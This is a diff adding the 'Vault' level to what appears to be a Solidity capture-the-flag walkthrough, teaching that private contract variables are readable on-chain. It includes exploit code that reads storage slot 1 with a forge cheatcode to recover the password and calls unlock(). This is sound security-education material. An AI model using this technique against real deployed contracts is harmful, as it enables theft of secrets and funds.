@@ -466,3 +466,46 @@ attackerContract.byebye(payable(challengeAddress));
 
 * https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
 * https://docs.soliditylang.org/en/v0.8.19/introduction-to-smart-contracts.html#deactivate-and-self-destruct
+
+## 08 Vault
+
+To beat this level, we need to comply with
+
+```solidity
+!instance.locked();
+```
+
+### Solution
+
+The vault unlocks when the `locked` variable is false.
+
+In theory one has to know its password (which is a private variable in the contract) to beat the level...
+
+```solidity
+bytes32 private password;
+```
+
+```solidity
+function unlock(bytes32 _password) public {
+  if (password == _password) {
+    locked = false;
+  }
+}
+```
+
+... But blockchain data is public! Being `password` the second variable in the `Vault` contract, it is assigned to the slot `1`. Then. to beat this level, we just read the slot to get the password, and use it to unlock the vault.
+
+```solidity
+// as reading another's contract storage
+// is not supported by solidity (i.e. It needs a forge "cheatcode"),
+// imagine this attack being made from a forge script
+bytes32 password = vm.load(challengeAddress, bytes32(uint256(1)));
+
+// too lazy to write code for an interface? Just do the call
+(bool success,) = challengeAddress.call(abi.encodeWithSignature("unlock(bytes32)", password));
+success;
+```
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html
